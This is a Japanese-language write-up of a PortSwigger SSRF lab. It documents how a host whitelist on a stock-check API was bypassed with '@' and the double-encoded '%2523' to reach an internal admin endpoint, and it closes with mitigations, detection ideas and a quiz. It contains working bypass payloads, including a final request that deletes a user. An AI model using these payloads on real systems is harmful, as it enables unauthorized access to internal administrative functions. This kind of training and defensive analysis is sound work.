# SSRF：ホワイトリスト回避による内部管理画面アクセス

## 1. 検証概要

| 項目 | 内容 |
|---|---|
| 学習教材 | PortSwigger Web Security Academy |
| ラボ | SSRF with whitelist-based input filter |
| 難易度 | Practitioner |
| 対象 | 商品在庫確認 API：`POST /product/stock` |
| ツール | Burp Suite Community Edition（Proxy / HTTP history、Repeater） |
| 実施日 | 2026年11月5日 |
| 結果 | LAB Solved |
| 理解度 | 4/5問正解（80%） |

### 検証目的

在庫照会先 `stockApi` にURLを指定できる機能で、ホスト名を許可リストで制限する仕組みを、`@` と二重URLエンコードによるURL解釈の違いで回避できるか検証する。

---

## 2. 実務上の攻撃シナリオ

### 2.1 システムの想定

ECサイトの在庫確認機能は外部の在庫管理サービスへHTTP通信する。`stockApi` パラメータは接続先URLを保持している。開発者は許可したホスト以外への通信を禁止しているが、サーバー側にはユーザー管理機能も存在する。

### 2.2 攻撃者の立場と狙い

商品ページを閲覧できる外部利用者が、在庫確認用HTTPリクエストのURLを改変する。Webサーバーを踏み台にして、通常は外部から到達できない管理機能にアクセスすることを狙う。

### 2.3 攻撃から想定被害までの流れ

1. `POST /product/stock` に `stockApi` が含まれることを確認する。
2. `http://127.0.0.1/` を指定するが許可ホスト以外として拒否される。
3. `@` を含むURLでホスト名チェックの挙動を確認する。
4. `#` は拒否されたが、`%2523` に二重エンコードすると異なる応答が返る。
5. 最終URLで内部のユーザー削除機能へのリクエストを試み、学習ラボがSolvedになった。
6. 実務では、管理機能側の認証・認可が不十分な場合、他人のアカウント削除や業務障害につながり得る。

### 2.4 被害・原因・対策の対応関係

| 観点 | 内容 |
|---|---|
| 想定被害 | アカウントの不正削除、利用不能、内部情報へのアクセス、復旧負担 |
| 根本原因 | URLの検査と実際の通信で解析・デコードの結果が食い違う可能性。ホスト名検査だけでは接続先を保証できない |
| 防止策 | 在庫照会先の固定、実際の接続先の確認、ループバック・内部宛通信の遮断、管理機能の認証・認可 |
| 検知策 | 異常URLとエラー、在庫機能からの内部宛通信、管理操作ログの突き合わせ |

**実務上の被害は仮定であり、ラボで企業への影響を確認したものではない。**

---

## 3. 技術的背景

### SSRFとホワイトリスト

SSRFは、Webサーバーに本来意図しないURLへ通信させる問題。ホワイトリストは「許可した接続先だけを通す」方式だが、チェックしたURLと実際に接続する宛先が一致しなければ不十分である。

### `@` と `#` の意味

- `@`：URLのユーザー情報とホストを区切る文字。例：`http://user@example.com/` では `example.com` がホスト。
- `#`：URLのフラグメントの区切り文字。通常、フラグメントはHTTPリクエストの宛先として送信されない。

### 二重URLエンコード

`#` のURLエンコードは `%23`。さらに `%` を `%25` としてエンコードすると `%2523` になる。

```text
%2523 → %23 → #
```

異なる処理段階でデコード・URL解析が行われると、検査時と実行時のURL解釈がずれる可能性がある。内部の解析順序・デコード回数は未確認。

---

## 4. 検証手順と実際のHTTP通信

### STEP 1：初期リクエスト

商品ページの `Check stock` をクリックして `POST /product/stock` をRepeaterへ送った。初期本文（URLエンコード済み）：

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D11%26storeId%3D1
```

セッションCookieの値は記録しない。初期リクエストのレスポンス全文は未記録。

### STEP 2：許可されないホスト

```text
stockApi=http://127.0.0.1/
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"
```

許可ホスト制限で拒否された。

### STEP 3：ユーザー情報を含むURL

```text
stockApi=http://username@stock.weliketoshop.net/
```

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8

<h4>Internal Server Error</h4>
<p class=is-warning>Could not connect to external stock check service</p>
```

上記のHTMLはレスポンスの抜粋。HTTP 400とは異なる接続失敗エラーになった。公式Solutionではユーザー情報を含むURL形式を受け付けたことを示す挙動としている。

### STEP 4：`#` を挿入

```text
stockApi=http://username#@stock.weliketoshop.net/
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

"External stock check host must be stock.weliketoshop.net"
```

再び許可ホスト制限で拒否された。

### STEP 5：`#` を二重URLエンコード

```text
stockApi=http://username%2523@stock.weliketoshop.net/
```

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8

<h4>Internal Server Error</h4>
<p class=is-warning>Could not connect to external stock check service</p>
```

HTMLは抜粋。400から500に変化した。公式Solutionでは、`username` を接続先として扱おうとした可能性があると説明している。接続先の実測・接続成功を確認したものではない。

### STEP 6：最終リクエスト

```text
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Repeaterで送信後、**LAB Solved** の画面表示を確認した。

最終リクエストのHTTPステータス・レスポンス本文の全文は未確認。ラボの内部処理やDB上のユーザー削除状態を直接確認したわけではない。

---

## 5. 検証結果一覧

| 指定URLの特徴 | 観測結果 |
|---|---|
| `127.0.0.1` を直接指定 | HTTP 400 / 許可ホスト名違反 |
| `username@stock.weliketoshop.net` | HTTP 500 / 在庫サービス接続失敗 |
| `username#@stock.weliketoshop.net` | HTTP 400 / 許可ホスト名違反 |
| `username%2523@stock.weliketoshop.net` | HTTP 500 / 在庫サービス接続失敗 |
| `localhost:80%2523@.../admin/delete?username=carlos` | 送信後、LAB Solved |

**HTTP 500は攻撃成功の証拠ではない。** エラー本文から言えるのは接続失敗が報告されたということ。解析時・接続時の宛先を確定するには追加の証拠が必要になる。

---

## 6. 根本原因と考察

今回のホワイトリストは許可ホスト名を確認していたが、URLにユーザー情報・フラグメント相当の文字列・二重エンコードを組み合わせると、後段の処理との間にURL解釈の不一致が生じる可能性がある。

`@` 自体は権限を与えない。`%2523` 自体もセキュリティ機能を無効化しない。問題は、**許可したと判断した宛先と実際の接続先を一貫して制御できていないこと**にある。

内部管理機能への到達と管理者権限の獲得は別問題であり、適切な認証・認可も必要となる。

---

## 7. 推奨対策と検知

1. **宛先固定**：在庫確認の接続先URLをサーバー側に固定し、利用者には商品ID・店舗IDだけを指定させる。
2. **URLと接続先の一貫した検証**：解析・正規化結果、DNS名前解決後のIP、実際の接続先、ポート、リダイレクトを制限する。
3. **通信経路の制限**：在庫確認サーバーからループバック・内部管理ネットワークへ不要な通信をさせない。
4. **管理機能の認証・認可**：内部からの通信という理由だけでユーザー削除を許可しない。
5. **ログと監視**：`@` や `%2523` を含むURL、400・500の連続発生、内部宛通信、管理操作ログを関連付けて検知・調査する。

---

## 8. 実務上の影響

内部管理画面への到達、内部情報の閲覧、権限不備がある場合の管理操作悪用などが想定される。影響範囲は接続可能なネットワークと内部サービスの権限制御に依存する。

**実在企業・第三者システムでの影響は未検証。**

---

## 9. 未確認事項

- 500応答時にサーバーが接続しようとした実際のホスト
- URLパーサー・デコード処理の順序と回数
- ホワイトリスト判定の内部実装
- 最終リクエストのHTTPレスポンス全文
- 実際のユーザーデータ削除状態
- 他のパターンや実システムでの再現性

実証した通信と、公式Solutionの説明・一般的な技術的解釈を区別して記録した。

---

## 10. 理解度チェック結果

| 問題 | テーマ | 回答 | 正解 | 判定 | 自信度 |
|---|---|---|---|---|---|
| Q1 | ホワイトリスト回避の理由 | B | B | 正解 | 自信あり |
| Q2 | `@` の役割 | B | B | 正解 | 自信あり |
| Q3 | `%2523` の意味 | C | C | 正解 | 自信あり |
| Q4 | HTTP 500から確認できること | わからない | B | 不正解 | 不明 |
| Q5 | SSRFの防止策 | C | C | 正解 | 自信あり |

**4/5問正解（80%）**

### 復習項目

Q4では「HTTP 500が返る＝接続や攻撃が成功した」とは言えないことを再確認。今回の400はホスト制限エラー、500は外部在庫サービス接続失敗を示していた。HTTPステータスと本文、画面上のSolvedを別の証拠として扱う。

---

## 11. 振り返りと今後の学習

Burp RepeaterでURLの `@`、`#`、`%2523` を段階的に変え、サーバーから返る400・500の変化とSolvedを確認した。URL構文やネットワークの基礎は理解途中のため、当面は公式Solutionに沿った操作とレスポンス観察を優先する。

---

## 12. 参考資料

- [PortSwigger：SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- [PortSwigger：SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP：Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

本レポートの検証対象はPortSwiggerの許可された学習用ラボのみ。第三者のシステムに対する無許可の検証は実施していない。